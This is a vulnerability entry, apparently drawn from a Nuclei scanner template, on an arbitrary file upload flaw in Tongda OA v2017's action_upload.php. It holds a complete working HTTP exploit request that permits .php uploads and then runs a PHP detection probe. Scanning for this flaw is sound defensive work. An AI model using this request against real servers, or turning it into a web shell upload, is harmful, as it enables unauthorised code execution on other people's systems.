# Vulnerability: Tongda OA v2017 action_upload - Arbitrary File Upload
**Classification:** CWE-434
**Source:** Nuclei Template (`tongda-action-uploadfile.yaml`)

## Description
Tongda OA v2017 action_upload.php file filtering is insufficient and does not require background permissions, resulting in arbitrary file upload vulnerabilities

## Vulnerable Code Pattern / Exploit Payload
```http
POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjhddzlqp

------WebKitFormBoundaryjhddzlqp
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

ffff
------WebKitFormBoundaryjhddzlqp
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
------WebKitFormBoundaryjhddzlqp
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

{{randstr}}
------WebKitFormBoundaryjhddzlqp
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
------WebKitFormBoundaryjhddzlqp
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php echo md5("{{string}}");unlink(__FILE__);?>
------WebKitFormBoundaryjhddzlqp
Content-Disposition: form-data; name="mufile"

submit
------WebKitFormBoundaryjhddzlqp--

GET {{randstr}}.php HTTP/1.1
Host: {{Hostname}}
```

